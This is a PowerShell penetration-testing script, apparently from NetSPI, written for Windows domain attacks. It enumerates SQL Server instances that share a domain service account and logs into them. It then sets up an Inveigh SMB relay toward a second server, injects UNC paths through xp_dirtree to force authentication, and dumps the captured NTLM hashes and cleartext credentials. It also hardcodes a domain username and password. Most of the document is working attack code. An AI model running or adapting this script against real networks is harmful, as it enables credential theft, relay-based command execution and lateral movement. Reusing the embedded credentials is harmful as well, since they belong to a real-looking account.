# author: scott sutherland (@_nullbind), NetSPI 2016
# scripty script 3000
# this requires powerupsql - pending clean up and role in
 
#-----------------
# discover share accounts here
#-----------------

# Get SQL Server service account for domain computers that are not computer accounts
Write-output "Querying domain controller for mssql spn..."
$z = Get-SQLInstanceDomain -verbose -DomainController 10.0.0.30 -Username northland\tsobiech -Password Blabla62
$zCount = $z.count
Write-output "$zCount MSSQL SPNs found"

# Filter out the computer accounts
Write-output "Filtering out computer accounts..."
$x = $z | Where-Object { $_.DomainAccount -notlike "*$"} | select computername,instance,domainaccount,lastlogon 
$xCount = $x.Count
Write-output "$xCount MSSQL SPNs found using domain accounts"

#-----------------
# Identify targets here
#-----------------

# check for sql server instances that use domain service accounts
if(-not $x){
    
    Write-output "0 shared SQL Server domain service accounts found."

}else{
        
    Write-output "Selecting shared accounts..."

    # Select accounts that are shared
    $y = $x | group domainaccount -NoElement | Where-Object {$_.count -ge 2}    
    $sharecount = $y | select name -Unique | measure | select count -ExpandProperty count
    Write-output "$sharecount shared SQL Server domain service accounts were found"

    # iterate through each shared account
    $y | %{

        # set shared account name
        $sharedaccount = $_.name
        
        Write-output "$sharedaccount : START"
    
        # get instances that match the current shared account
        $instances = $x | select computername,instance,domainaccount,lastlogon | ? {$_.domainaccount -eq $sharedaccount}

        # get number of unique computers that use the account
        $instancesUniqueComputer = $instances | select computername -Unique | measure | select count -ExpandProperty count
        Write-output "$sharedaccount : $instancesUniqueComputer servers were found that use the SQL Server domain service account $sharedaccount"
      
        # attempt to connect to each
        Write-output "$sharedaccount : attempting to connect to each one..."
        $AccessibleInstances = $instances | Get-SQLConnectionTest | ? {$_.status -eq "Accessible"}

        # count how many were accessible
        $AccessibleInstancesUniqueServers = $AccessibleInstances | select computername -Unique| measure | select count -ExpandProperty count
        if($AccessibleInstancesUniqueServers -ge 2){

            write-output "$sharedaccount : $AccessibleInstancesUniqueServers sql servers could be logged into that use the sql server service account $sharedaccount"

            # set target 1
            $target1 = $AccessibleInstances | select instance -First 1 -ExpandProperty instance
            $target1Computer = Get-ComputerNameFromInstance -Instance $target1
            write-output "$sharedaccount : $target1 set to target1" 

            # set target 2
            $target2 = $AccessibleInstances | ? {$_.computername -ne "$target1Computer"} | select instance -First 1 -ExpandProperty instance
            $target2ip = Resolve-DnsName $target2 | select IPaddress -ExpandProperty ipaddress
            write-output "$sharedaccount : $target2 set to target2" 

            #-----------------
            # attack here
            #-----------------
            # - import inveigh
            # sniff and set relay target to target2
            Write-Output "$sharedaccount : Starting sniffer"            
            Invoke-Inveigh -SMBRelay Y -SMBRelayTarget $target2ip -SMBRelayCommand "ping  10.0.0.247" -SpooferHostsReply $target1 -NBNS Y | Out-Null 

            # unc path injection for each ip
            Write-Output "$sharedaccount : Injecting UNC path into $target1"
            Get-NetIPAddress | select ipaddress | %{         
                $IP = $_.IPAddress
                # unc path inject into target1
                Get-SQLQuery -Instance $target2 -Query "xp_dirtree '\\$IP\path'" 
            }

            # wait 5 seconds
            sleep 5

            # check for win
            Write-Output "$sharedaccount : Checking for credentials captured during unc injection from $target1"
            Get-InveighCleartext 
            Get-InveighNTLMv1
            Get-InveighNTLMv2

            # on file goto next            
            Stop-Inveigh | Out-Null
            Clear-Inveigh | Out-Null
            Write-Output "$sharedaccount : Stopping sniffer"
        
        }else{

            # test connection
            Write-output "$sharedaccount : SQL Servers using the $sharedaccount service account could not be logged into."
        }
        Write-output "$sharedaccount : END"
    }
}

